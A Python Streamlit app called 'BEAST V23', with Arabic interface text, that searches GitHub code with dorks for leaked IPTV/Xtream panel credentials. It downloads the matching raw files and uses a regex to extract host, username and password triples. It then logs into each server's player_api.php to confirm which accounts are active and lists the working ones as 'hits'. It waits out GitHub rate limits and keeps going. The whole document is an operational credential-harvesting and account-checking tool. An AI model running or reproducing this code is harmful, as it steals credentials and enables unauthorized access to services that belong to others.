import streamlit as st
import requests
import re
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

st.set_page_config(page_title="BEAST V23 - STABLE SCANNER", layout="wide")

# --- نظام الدخول ---
if "auth" not in st.session_state:
    st.session_state.auth = False

if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V23 - STABLE SCAN</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# --- التنسيق ---
st.markdown("""
<style>
    .stApp { background-color: #050505; }
    .active-hit {
        background: #0d1117; border-left: 5px solid #00ff41;
        padding: 12px; border-radius: 5px; margin-bottom: 8px;
    }
    .text-green { color: #00ff41; font-weight: bold; }
</style>
""", unsafe_allow_html=True)

with st.sidebar:
    st.title("⚡ BEAST V23 STABLE")
    token = st.text_input("GitHub Token:", type="password")
    max_workers = st.slider("سرعة فحص الروابط", 10, 50, 25)
    start = st.button("🚀 ابدأ الفحص المستقر")
    st.info("تم إبطاء البحث قليلاً لتجنب حظر GitHub API")

st.subheader("📡 حالة الرادار")
radar_area = st.empty()
hits_area = st.container()

def check_server(host, user, pw):
    """فحص السيرفر بشكل منفصل وسريع"""
    try:
        check_url = f"{host}/player_api.php?username={user}&password={pw}"
        r = requests.get(check_url, timeout=4)
        if r.status_code == 200:
            data = r.json()
            if data.get("user_info", {}).get("status") == "Active":
                return True, data.get("user_info", {}).get("exp_date", "N/A")
    except:
        pass
    return False, None

if start and token:
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    
    dorks = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php"',
        'extension:php "username" "password" "server" "port"',
        'extension:txt "http://" "user" "pass" "panel"',
        'extension:json "server" "username" "password"',
        'path:.env "XTREAM"',
        'extension:txt "http://" "8080" "username" "password"',
        '"player_api.php?username=" extension:php'
    ]

    found_count = 0
    hits_list = []

    for dork in dorks:
        page = 1
        while page <= 5:  # فحص أول 5 صفحات من كل دورك لضمان السرعة
            search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=50"
            try:
                response = requests.get(search_url, headers=headers)
                
                if response.status_code == 401:
                    st.error("❌ التوكن (Token) غير صحيح أو انتهت صلاحيته!")
                    st.stop()
                elif response.status_code == 403:
                    radar_area.warning(f"⏳ GitHub طلب استراحة.. هننتظر ثواني ونكمل (Dork: {dork[:20]})")
                    time.sleep(30) # زيادة مدة الانتظار لتجاوز الحظر
                    continue
                
                res = response.json()
                items = res.get("items", [])
                if not items: break

                radar_area.info(f"🔎 فحص: {dork[:30]}.. | صفحة: {page}")

                # تجميع الروابط الخام
                raw_urls = []
                for item in items:
                    raw = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    raw_urls.append(raw)

                # فحص محتوى الملفات
                def process_url(url):
                    try:
                        content = requests.get(url, timeout=5).text
                        matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                        return matches
                    except: return []

                with ThreadPoolExecutor(max_workers=max_workers) as executor:
                    future_to_url = {executor.submit(process_url, url): url for url in raw_urls}
                    for future in as_completed(future_to_url):
                        creds = future.result()
                        for host, user, pw in creds:
                            # فحص الحساب شغال ولا لأ
                            is_active, exp = check_server(host, user, pw)
                            if is_active:
                                found_count += 1
                                with hits_area:
                                    st.markdown(f"""
                                    <div class="active-hit">
                                        <span class="text-green">✅ HIT #{found_count}</span><br>
                                        <span style="color:white;">{host} | {user}:{pw}</span><br>
                                        <span style="color:gray; font-size:12px;">Expiry: {exp}</span>
                                    </div>
                                    """, unsafe_allow_html=True)
                                hits_list.append(f"{host}|{user}|{pw}")

                page += 1
                time.sleep(2) # تأخير بسيط بين الصفحات عشان جيت هاب ميزعلش

            except Exception as e:
                radar_area.error(f"حدث خطأ: {e}")
                time.sleep(5)

    st.success(f"✅ خلصنا! جمعنا {found_count} حساب.")
